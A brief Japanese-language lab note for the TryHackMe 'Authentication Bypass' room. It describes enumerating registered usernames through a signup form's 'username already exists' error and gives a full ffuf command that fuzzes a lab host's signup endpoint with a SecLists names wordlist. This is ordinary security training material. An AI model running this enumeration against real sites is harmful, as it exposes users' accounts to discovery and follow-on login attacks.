# TryHackMe - Authentication Bypass
[https://tryhackme.com/room/authenticationbypass](https://tryhackme.com/room/authenticationbypass)

## ユーザ名列挙
- 新規作成フォームで既に存在するユーザ名のエラーが出るのを利用して登録されているユーザを列挙する

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.48.216/customers/signup -mr "username already exists"
```